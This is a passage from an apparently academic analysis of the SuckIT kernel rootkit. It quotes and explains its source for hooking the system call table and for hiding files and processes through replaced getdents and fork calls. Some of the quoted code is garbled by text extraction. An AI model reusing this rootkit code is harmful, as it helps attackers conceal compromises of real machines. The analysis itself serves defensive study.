B. Analysis of the SuckIT Source Code 
The kernel.c program is the only portion of the SuckIT 
rootkit that is resident in kernel memory.  This code 
contains the variables that must be relocated or made 
global for the rootkit to execute.  It also contains the 
hacked system calls that SuckIT will use to replace the 
valid system calls in the system call table as well as any 
necessary functions required by the new system calls. 
This program contains the source code for the 25 
system calls that the SuckIT rootkit replaces within the 
kernel memory.   The kernel.c program also contains a 
routine to replace an existing system call pointer with the 
newly created system call pointer.  The following is the 
code to accomplish this: 
#define 
hook(name) \ 
newsct[__NR_##name] =  
           ((ulong) new_##name - 
\ 
      (ulong) 
kernel_start) + 
\ 
      (ulong) mem + 
SCT_TABSIZE; 
This code calculates the proper address of the new system 
call code that has been written into kernel memory.  This 
routine is used by the KINIT system call wrapper  
int 
new_getdents(int fd, struct de *dirp, int count) 
{ 
int 
oldlen, len; 
uchar  
*cpy, *dest; 
uchar  
*p = (uchar *) dirp; 
pid_struc 
*pi; 
if (count  0) { 
if (!is_hidden(dp->d_name, dp->d_ino)) { 
memcpy(dest, p, dp->d_reclen); 
dest += dp->d_reclen; 
} 
len -= dp->d_reclen; 
p += dp->d_reclen; 
} 
#undef dp 
memcpy(dirp, cpy, dest - cpy); 
ufree(cpy, oldlen); 
len = new_getdents(fd, (void *) (((uchar *) dirp) +    
(dest - cpy)),(int) (count - (dest - cpy))); 
if (len d_name), the new_getdents() 
system call then calls the function is_hidden() to check 
and see if this object (file or directory) is designated to be 
hidden from a directory listing.       This routine checks to 
see is the name that has been retrieved has the HIDESTR 
(hide string) appended to the end of the name.  The value 
for HIDESTR is established when SuckIT is compiled on 
the target system and has a default value of “sk12”.   If 
this name is not designated to be hidden than a value of 1 
is returned to the calling routine, otherwise a value of 0 is 
returned.  The new_getdents() system call will only output 
those object names that are not designated to be hidden. 
The following is a listing of the code from the 
is_hidden() routine: 
/* check whether given file & inode 
should be hidden */ 
int 
is_hidden(char *name, ulong ino) 
{ 
uchar *h = hidestr(); 
if (*filehiding()) { 
register int l = 
strlen(name); 
if ((l >= sizeof(HIDESTR)-
1) && 
    (!strcmp(h, &name[l-  
             (sizeof(HIDESTR)-1)]))) 
     return 1; 
} 
if (*pidhiding()) { 
ulong c = 0; 
pid_struc *p; 
char *b = name; 
while (*b) { 
if ((*b == '/') && 
(*(b + 1) != 0))   
                 name = b + 1; 
b++; 
} 
        while (*name) { 
                if ((*name  '9')) 
                        break; 
                c = c * 10 + 
(*name++) -   
                     '0'; 
} 
        if (((ino - 2) / 65536) 
!= c)   
            return 0; 
p = find_pid(c); 
if ((p) && (IS_HIDDEN(p))) 
       return 1; 
} 
return 0; 
} 
We will now examine the sys_fork() system call that 
SuckIT uses to subvert the target computer.  This analysis 
is similar to the analysis we conducted of this same system 
call in an earlier paper on the KNARK kernel level rootkit 
[19].  SuckIT refers to this system call as new_fork.  The 
sys_fork() system call is used to create a child of a parent 
process.  The new_fork() system call that is used to fork a 
process first retrieves the pid of the parent process.  It then 
checks to see if the parent process is one that has been 
designated to be hidden.  It accomplishes this by using the 
same IS_HIDDEN function that is defined within the 
kernel.c program of SuckIT.  If the parent PID is a hidden 
process, then the child PID is also designated to be 
hidden.  As with the new_getdents system call, the 
new_fork system call also makes a call to the original fork 
system call in order to obtain a new PID.  This is also the 
case for the KNARK knark_fork system call.  A 
difference between the knark_fork system call and the 
new_fork system call is that unlike knark_fork, the PID’s 
designated to be hidden are not placed in a separate linked 
list.  The SET_HIDDEN() function sets a value within the 
PID structure to a specific value designating this PID as a 
hidden PID.  The following is a display of the new_fork() 
source code: 
int new_fork(struct pt_regs regs) 
{ 
pid_struc 
*parent; 
int 
pid; 
parent = curr(); 
pid = SYS(fork, regs); 
if (pid > 0) { 
if ((parent) && (IS_HIDDEN(parent))) 
 { 
  pid_struc *n; 
  n = add_pid(pid); 
  if (n) { 
    SET_HIDDEN(n); 
     current()->flags &= ~PF_MASK; 
  } 
 } 
} 
return pid; 
} 
As previously mentioned, the kernel_init() routine 
associated with the KINIT wrapper  is the routine that sets 
up the new system calls as well as the new system call 
table, restores the original system call table, and redirects 
all system calls to the new system call table.   
/* initialization code (see install.c 
for details) */ 
void kernel_init(uchar *mem, ulong 
*sct,   
             ulong *sctp[2], ulong 
oldsys) 
{ 
ulong  ksize = (ulong) kernel_end 
-    
                (ulong) kernel_start; 
ulong  *newsct = (void *) mem; 
sct[OURSYS] = oldsys; 
memset(mem + SCT_TABSIZE + ksize, 
0,   
             PID_TABSIZE); 
*oldsct() = (ulong) sct; 
*pidtab() = (void *) (mem + 
SCT_TABSIZE   
                            + ksize); 
memcpy(mem, sct, SCT_TABSIZE); 
hook(OURCALL); 
hook(clone); 
hook(fork); 
hook(vfork); 
hook(getdents); 
hook(getdents64); 
hook(kill); 
hook(open); 
hook(close); 
#ifdef SNIFFER 
hook(read); 
hook(write); 
#endif 
#ifdef SNIFFER  
hook(execve); 
#endif 
#ifdef INITSTUFF 
hook(utime); 
hook(oldstat); 
hook(oldlstat); 
hook(oldfstat); 
hook(stat); 
hook(lstat); 
hook(fstat); 
hook(stat64); 
hook(lstat64); 
hook(fstat64); 
hook(creat); 
hook(unlink);  
hook(readlink); 
#endif 
memcpy(oldsctp(), sctp, 2 * 
sizeof(ulong)); 
*sctp[0] = (ulong) newsct; 
/* 
normal   
                                call */ 
*sctp[1] = (ulong) newsct; 
/* 
ptraced  
                                call */ 
} 
This function calculates the amount of space (ksize) 
required to store the new system call code into memory in 
similar manner to the way this space is calculated in the 
install.c program.   The function then sets up a pointer 
(newsct) to the starting address of the newly allocated 
kernel memory.   This pointer will become the address of 
the new system call table that is created by SuckIT.    The 
original system call table is then restored back to its 
original state with the system call #59 pointer being reset 
back to the address of the original sys_uname address by 
the following line of code: sct[OURSYS] = oldsys;.  The 
command, memset() initializes the PID table.    The 
command *oldsct() = (ulong) sct; establishes a pointer to 
the original system call table.   The *pidtab() = (void *) 
(mem + SCT_TABSIZE + ksize); command establishes a 
pointer to the PID table.   The command memcpy(mem, 
sct, SCT_TABSIZE); copies the original system call table 
to the start of the newly allocated kernel space.    The next 
25 lines of code set up the new SuckIT replacement 
system calls and places pointers to these system calls in  
the new system call table.    The command memcpy 
(oldsctp(), sctp, 2 * sizeof(ulong)); copies the addresses of 
the original system call tables for both normal and ptraced 
system calls  to a location where this address can be 
retrieved () at a future time if necessary.  The last  two 
lines of code set the system call table pointers for both 
normal and ptraced system calls to the new system call 
table located in the newly allocated kernel memory.